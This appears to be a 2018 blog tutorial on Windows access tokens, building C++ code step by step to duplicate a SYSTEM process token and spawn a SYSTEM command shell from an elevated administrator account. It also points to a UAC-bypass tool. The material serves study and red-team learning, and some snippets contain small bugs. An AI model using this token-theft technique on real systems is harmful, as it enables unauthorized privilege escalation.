---
layout: post
title:  "Windows API and Impersonation Part 1 - How to get SYSTEM using Primary Tokens"
date:   2018-09-17 11:53:01 -0700
categories: research
---


# Introduction

This is my blog post for study notes about Windows API and Impesonation. It is going to describe my journey into self-learnig about how Windows API and Impersonation works and also as a tutorial for people who want to know more about it but do not have a programming skills  good enough to walk by yourself through all the Microsoft Documentation pages to get stuff 
done.

The main objective is to "get system" from Local Administrator account. After reading this post completely, I guarantee you have enough resources to do it by yourself using your own code!

# Documentation

1.  [Windows API Impersonation Functions](https://msdn.microsoft.com/en-us/library/cc246062.aspx)
2. [Impersonation Tokens](https://docs.microsoft.com/en-us/windows/desktop/secauthz/impersonation-tokens)
3. [Authentication Functions](https://docs.microsoft.com/pt-br/windows/desktop/SecAuthN/authentication-functions)
4. [Windows API - OpenProcess](https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-openprocess)
5. [Token Access List](https://docs.microsoft.com/pt-br/windows/desktop/SecAuthZ/access-rights-for-access-token-objects)

# Windows privileges
Windows Systems rely upon "Access Tokens" to identify a security level or access within the system. Every process has a Primary and Impersonation token and both could be used to "get system" in a Windows environment.

To visually identify your current privilege set, send the following command to your shell:
```cmd
C:\>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

The above output occurs when you belong to a Medium-Integrity process. Which means that even if we are Local Admin, we still do not have all privileges or enough privileges to do nasty things like popping a SYSTEM shell.

To own a process with all privileges, you need to bypass UAC, legitimately or using any bypass technique. If you are interested in UAC Bypassing, I recommend visiting this tool named [UACME](https://github.com/hfiref0x/UACME) by hfiref0x. By far the most complete tool available freely in the internet for UAC bypassing.

So, after we got past UAC, we now have a a full set of privileges!
```cmd
C:\>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                       
========================================= ================================================================== 
SeCreateTokenPrivilege                    Create a token object                                              
SeAssignPrimaryTokenPrivilege             Replace a process level token                                      
SeLockMemoryPrivilege                     Lock pages in memory                                               
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 
SeTcbPrivilege                            Act as part of the operating system                                
SeSecurityPrivilege                       Manage auditing and security log                                   
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           
SeLoadDriverPrivilege                     Load and unload device drivers                                     
SeSystemProfilePrivilege                  Profile system performance                                         
SeSystemtimePrivilege                     Change the system time                                             
SeProfileSingleProcessPrivilege           Profile single process                                             
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       
SeCreatePagefilePrivilege                 Create a pagefile                                                  
SeCreatePermanentPrivilege                Create permanent shared objects                                    
SeBackupPrivilege                         Back up files and directories                                      
SeRestorePrivilege                        Restore files and directories                                      
SeShutdownPrivilege                       Shut down the system                                               
SeDebugPrivilege                          Debug programs                                                     
SeAuditPrivilege                          Generate security audits
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 
SeChangeNotifyPrivilege                   Bypass traverse checking                                           
SeUndockPrivilege                         Remove computer from docking station                               
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   
SeImpersonatePrivilege                    Impersonate a client after authentication                          
SeCreateGlobalPrivilege                   Create global objects                                              
SeTrustedCredManAccessPrivilege           Access Credential Manager as a trusted caller                      
SeRelabelPrivilege                        Modify an object label                                             
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     
SeTimeZonePrivilege                       Change the time zone
SeCreateSymbolicLinkPrivilege             Create symbolic links
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session
```

It is noticeable that we possess a lot more privileges than before. Now we can proceed to more advanced stuff.

## Enabling privileges
Sometimes you do have a certain privilege in your current set of privileges (shown by whoami /priv), but it is disabled. 

The following C++ code is capable of enabling it during a program run-time:
```c++
#include <Windows.h>
#include <tchar.h>

BOOL EnableWindowsPrivilege(WCHAR* Privilege)
{
	/* Tries to enable privilege if it is present to the Permissions set. */
	LUID luid = {};
	TOKEN_PRIVILEGES tp;
	HANDLE currentProcess = GetCurrentProcess();
	HANDLE currentToken = {};
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!LookupPrivilegeValue(NULL, Privilege, &luid)) return FALSE;
	if (!OpenProcessToken(currentProcess, TOKEN_ALL_ACCESS, &currentToken)) return FALSE;
	if (!AdjustTokenPrivileges(currentToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) return FALSE;
	return TRUE;
}

int wmain(void)
{
	// Enable SeDebugPrivilege (dubbed SE_DEBUG_NAME by constant variable) 
	if(!EnableWindowsPrivilege(SE_DEBUG_NAME))
	{
		wprintf(L"Could not enable SeDebugPrivilege!\n");
		return 1;
	}
	return 0;
}
```

## Checking privileges
Sometimes you need to check your current set of privileges for the presence of a certain privilege, before starting a procedure or function.

The following C++ code is an example of how to check for a specific privilege:
```c++
#include <Windows.h>
#include <tchar.h>

BOOL CheckWindowsPrivilege(WCHAR *Privilege)
{
	/* Checks for Privilege and returns True or False. */
	LUID luid; 
	PRIVILEGE_SET privs;
	HANDLE hProcess;
	HANDLE hToken;
	hProcess = GetCurrentProcess();
	if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) return FALSE;
	if (!LookupPrivilegeValue(NULL, Privilege, &luid)) return FALSE;
	privs.PrivilegeCount = 1;
	privs.Control = PRIVILEGE_SET_ALL_NECESSARY;
	privs.Privilege[0].Luid = luid;
	privs.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;
	BOOL bResult;
	PrivilegeCheck(hToken, &privs, &bResult);
	return bResult;
}

int wmain(void)
{
	if(!CheckWindowsPrivilege(SE_DEBUG_NAME))
	{
		wprintf(L"I do not have SeDebugPrivilege!\n");
		return 1;
	}
	wprintf(L"I do have SeDebugPrivilege!\n");
	return 0;
}
```

# How to get system using Primary Tokens
This section of this post is going to detail the first method I got system playing with Windows API. It will detail each function needed to get the method working, step-by-step, until a full PoC code is built.


## OpenProcess
This function is very important to study as it is the function responsible to get a "Handle" for a remote process in Windows systems. Without a handle, you will not be able to interact with these process and get any information from it. Let's check it's calling syntax:

```c++
HANDLE OpenProcess(
  DWORD dwDesiredAccess,
  BOOL  bInheritHandle,
  DWORD dwProcessId
);
```

To get a handle using OpenProcess, you will need a DWORD representing the desired access to the remote process, a BOOLEAN indicating that if the processes spawned by this process are going to inherit access tokens from it and a DWORD Process Identifier (PID) to call it. Check the following C++ example to get a handle for a process with PID value of 1234:

```c++
#include "windows.h"
#include "tchar.h"

int wmain(int argc, WCHAR **argv) 
{
    HANDLE hProcess;
    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, 1234);
    if(!hProcess) 
    {
        wprintf(L"Could not get a handle to remote process.\n");
        return 1;
    }
    wprintf(L"We got our handle!\n");
    return 0;
}
```

## OpenProcessToken
This function requires a handle. So if you haven't read about OpenProcess, you should do it now.

After you already have a handle to a process, you can open it and query information about it's security access tokens. Let's review about the calling syntax:
```c++
BOOL OpenProcessToken(
  HANDLE  ProcessHandle,
  DWORD   DesiredAccess,
  PHANDLE TokenHandle
);
```

Three arguments. The first, a process handle. The second is a desired access for the token and the third is a pointer to store this token we are "opening" from this process.

Check this C++ example about how we can use this function:

```c++
#include "windows.h"
#include "tchar.h"
#pragma comment(lib, "advapi32.lib")

int wmain(int argc, WCHAR **argv)
{
	if (argc < 2)
	{
		wprintf(L"Usage: %ls <PID>\n", argv[0]);
		return 1;
	}

	DWORD dwPid;
	dwPid = _wtoi(argv[1]);
	wprintf(L"[+] PID chosen: %d\n", dwPid);

	// Try to open the remote process.
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, dwPid);
	if (!hProcess)
	{
		wprintf(L"ERROR: Could not get a handle to PID %d\n", dwPid);
		return 1;
	}

	wprintf(L"[+] Got handle for PID: %d\n", dwPid);
	
	// Create a pointer to a Token
	PHANDLE pToken = new HANDLE;
	BOOL bResult = OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_IMPERSONATE, pToken);
	if (!bResult)
	{
		wprintf(L"ERROR: Could not open process token.\n");
		return 1;
	}
	
	wprintf(L"[+] Process token is now open.\n");
	
	return 0;
}
```

## DuplicateTokenEx
This function requires a lot of attention. It does the magic we need to get a SYSTEM token and using it elsewhere. It can duplicate a token object. It is useful so we can use it to create/spawn another process using a token that belongs to another process. This might be useful when you want SYSTEM privileges but you are an Administrator User after UAC.

Check how it is needed to call it:
```c++
BOOL DuplicateTokenEx(
  HANDLE                       hExistingToken,
  DWORD                        dwDesiredAccess,
  LPSECURITY_ATTRIBUTES        lpTokenAttributes,
  SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
  TOKEN_TYPE                   TokenType,
  PHANDLE                      phNewToken
);
```

And now look our C++ code example:
```c++
HANDLE GetAccessToken(DWORD pid)
{
	
	/* Retrieves an access token for a process */
	HANDLE currentProcess = {};
	HANDLE AccessToken = {};
	DWORD LastError;

	if (pid == 0)
	{
		currentProcess = GetCurrentProcess();
	}
	else
	{
		currentProcess = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
		if (!currentProcess)
		{
			LastError = GetLastError();
			wprintf(L"ERROR: OpenProcess(): %d\n", LastError);
			return (HANDLE)NULL;
		}
	}
	if (!OpenProcessToken(currentProcess, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &AccessToken))
	{
		LastError = GetLastError();
		wprintf(L"ERROR: OpenProcessToken(): %d\n", LastError);
		return (HANDLE)NULL;
	}
	return AccessToken;
}

int wmain(int argc, WCHAR **argv)
{
	DWORD LastError;

	/* Argument Check */
	if (argc < 2)
	{
		wprintf(L"Usage: %ls <PID>\n", argv[0]);
		return 1;
	}

	/* Process ID definition */
	DWORD pid;
	pid = _wtoi(argv[1]);
	if ((pid == NULL) || (pid == 0)) return 1;

	wprintf(L"[+] Pid Chosen: %d\n", pid);

        // Retrieves the remote process token.
	HANDLE pToken = GetAccessToken(dwPid);
	
	//These are required to call DuplicateTokenEx.
	SECURITY_IMPERSONATION_LEVEL seImpersonateLevel = SecurityImpersonation;
	TOKEN_TYPE tokenType = TokenPrimary;
	HANDLE pNewToken = new HANDLE;
	if(!DuplicateTokenEx(pToken, MAXIMUM_ALLOWED, NULL, seImpersonateLevel, tokenType, &pNewToken))
	{
		DWORD LastError = GetLastError();
		wprintf(L"ERROR: Could not duplicate process token [%d]\n", LastError);
		return 1;
	}
	wprintf(L"Process token has been duplicated.\n");
}
```

It is a lot of code. But in summary, this code uses a function named GetAccessToken to retrieve a handle for a remote process, given a DWORD as input that represents a process PID number. If successful, it duplicates the token retrieved, so we can use it to impersonate the token owner identity later.

## ImpersonateLoggedOnUser
Another very important function that is crucial to impersonate identities in Windows systems. It is needed to call this function in our program as it will allow our program thread to impersonate the security context of any logged-on user (as well service accounts) using a token handle. Which we got using DuplicateTokenEx, for example.

So, after we have a spare Token handle, by using DuplicateTokenEx, we are able to call this function, as explained in the documentation:
```c++
BOOL ImpersonateLoggedOnUser(
  HANDLE hToken
);
```

Using the code from DuplicateTokenEx() topic, we can now impersonate the token:
```c++
if(!DuplicateTokenEx(pToken, MAXIMUM_ALLOWED, NULL, seImpersonateLevel, tokenType, &pNewToken))
	{
		DWORD LastError = GetLastError();
		wprintf(L"ERROR: Could not duplicate process token [%d]\n", LastError);
		return 1;
	}
	wprintf(L"Process token has been duplicated.\n");

ImpersonateLoggedOnUser(pNewToken);
// Below this line we are allowed to call functions as SYSTEM in this thread.
```

## CreateProcessWithToken
CreateProcessWithToken is the last function we are going to call before raising ourselves to SYSTEM user. After ImpersonateLoggedOnUser is called (and not returning errors), we are able to use our Duplicated token to spawn a process under a new security context.

```c++
BOOL CreateProcessWithTokenW(
  HANDLE                hToken,
  DWORD                 dwLogonFlags,
  LPCWSTR               lpApplicationName,
  LPWSTR                lpCommandLine,
  DWORD                 dwCreationFlags,
  LPVOID                lpEnvironment,
  LPCWSTR               lpCurrentDirectory,
  LPSTARTUPINFOW        lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation
);
```


Continuing our code from "ImpersonateLoggedOnUser":
```c++
if(!DuplicateTokenEx(pToken, MAXIMUM_ALLOWED, NULL, seImpersonateLevel, tokenType, &pNewToken))
	{
		DWORD LastError = GetLastError();
		wprintf(L"ERROR: Could not duplicate process token [%d]\n", LastError);
		return 1;
	}
	wprintf(L"Process token has been duplicated.\n");

ImpersonateLoggedOnUser(pNewToken);
// Now we are alowed to call functions as SYSTEM in this thread.

/* Starts a new process with SYSTEM token */
STARTUPINFO si = {};
PROCESS_INFORMATION pi = {};
BOOL ret;
ret = CreateProcessWithTokenW(pNewToken, LOGON_NETCREDENTIALS_ONLY, L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
if (!ret)
{
	DWORD lastError;
	lastError = GetLastError();
	wprintf(L"CreateProcessWithTokenW: %d\n", lastError);
	return 1;
}
```

As CreateProcessWithTokenW executes succesfully, a windows shell under NT AUTHORITY\SYSTEM should appear on your screen.

![Screenshot](/assets/windows_api-01.JPG)

This concludes the first part of this blog post. In the second part I intend to show how to use Impersonation tokens to get SYSTEM shell.